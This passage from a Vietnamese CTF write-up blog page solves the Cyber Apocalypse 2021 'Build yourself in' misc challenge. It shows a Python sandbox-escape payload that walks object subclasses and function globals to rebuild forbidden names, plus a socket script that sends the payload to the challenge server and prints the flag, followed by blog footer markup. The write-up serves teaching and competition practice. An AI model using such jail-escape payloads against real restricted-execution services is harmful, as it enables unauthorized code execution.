[(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">7</span>:<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">1</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>][<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>values()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">22</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>]))
+</code></pre></div><p>Thử chạy payload và đọc flag nha.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> socket <span style="color:#f92672">import</span> socket
+<span style="color:#f92672">from</span> telnetlib <span style="color:#f92672">import</span> Telnet
+
+sock <span style="color:#f92672">=</span> socket()
+sock<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;206.189.121.131&#39;</span>, <span style="color:#ae81ff">30736</span>))
+<span style="color:#66d9ef">print</span>(sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>))
+sock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;print([(k,v) for k,v in ().__class__.__base__.__subclasses__()[132].__init__.__globals__.items()][45][1]([(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][1][0][4:5] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][0][0][3:4] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][0][1][3:4] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][1][1][4:5] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][5][0][2:3] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][0][1][8:9] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][0][0][3:4] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][2][0][7:8] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][6][1][-4] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][0][1][3:4] + [i for i in [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][-5][1].values()][1][21:22] + [(k,v) for k,v in ().__class__.__base__.__subclasses__()[133].__init__.__globals__.items()][0][1][3:4]))</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+flag <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+
+<span style="color:#66d9ef">print</span>(flag)
+sock<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Đã lấy được flag.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.45.10.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.45.10.png"></p>
+<p><code>Flag là: CHTB{n0_j4il_c4n_h4ndl3_m3!}</code></p>
+
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">THẺ ĐÁNH DẤU</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf/">ctf</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/cyber-apocalypse-2021/">Cyber Apocalypse 2021</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/ctf-misc-writeup/">ctf misc writeup</a>
+
+  <a class="tag tag--primary tag--small" href="https://manhnv.com/tags/writeup/">writeup</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Misc Alien Camp and Input as a Service writeup">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 <a href="https://facebook.com/manhnv.sec">Manhnv</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-alien-camp-and-input-as-a-service-writeup/" data-tooltip="[Cyber Apocalypse 2021]- Misc Alien Camp and Input as a Service writeup">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://manhnv.com/2021/04/cyber-apocalypse-2021-misc-build-yourself-in-writeup/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmanhnv.com%2F2021%2F04%2Fcyber-apocalypse-2021-misc-build-yourself-in-writeup%2F">
+          <i class="fa fa-facebook-official"></i><span>Chia sẻ với Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fmanhnv.com%2F2021%2F04%2Fcyber-apocalypse-2021-misc-build-yourself-in-writeup%2F">
+          <i class="fa fa-twitter"></i><span>Chia sẻ với Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fmanhnv.com%2F2021%2F04%2Fcyber-apocalypse-2021-misc-build-yourself-in-writeup%2F">
+          <i class="fa fa-google-plus"></i><span>Chia sẻ với Google&#43;</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+    
+    <h4 id="about-card-name">Manh NV</h4>
+    
+      <div id="about-card-bio">Chia sẻ là niềm vui</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Viết blog dạo
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        VietNam
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://manhnv.com/images/cover-v1.2.0.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://manhnv.com/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+  
+    <script src="https://manhnv.com/js/scripts.js"></script>
+  
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/manhnv.com\/2021\/04\/cyber-apocalypse-2021-misc-build-yourself-in-writeup\/';
+          
+            this.page.identifier = '\/2021\/04\/cyber-apocalypse-2021-misc-build-yourself-in-writeup\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'nguyen-manh';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
